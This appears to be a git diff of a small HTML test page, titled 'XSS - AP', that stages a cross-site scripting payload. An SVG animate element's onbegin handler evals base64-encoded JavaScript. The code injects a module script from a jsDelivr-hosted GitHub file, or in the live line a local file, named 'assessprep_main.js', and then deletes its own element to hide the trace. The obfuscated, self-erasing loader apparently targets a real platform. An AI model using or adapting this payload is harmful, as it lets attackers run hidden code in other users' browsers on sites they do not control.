@@ -3,10 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>XSS - AP</title>
 </head>
 <body>
     <h1>Gunna get XSS</h1>
+    <!-- <svg id="payload-svg"><animate onbegin='eval(atob(`dmFyIGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsgYS50eXBlID0gIm1vZHVsZSI7YS5zcmMgPSAnaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL2V4aXN0ZW5jaW5nL1hTUy9hc3Nlc3NwcmVwX21haW4uanMnOyBkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKGEpOyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgicGF5bG9hZC1zdmciKS5yZW1vdmUoKTs=`))' attributeName=x dur=1s></animate> -->
     <svg id="payload-svg"><animate onbegin='eval(atob(`dmFyIGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsgYS50eXBlID0gIm1vZHVsZSI7YS5zcmMgPSAnLi9hc3Nlc3NwcmVwX21haW4uanMnOyBkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKGEpOyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgicGF5bG9hZC1zdmciKS5yZW1vdmUoKTs=`))' attributeName=x dur=1s></animate>
 </body>
 </html>
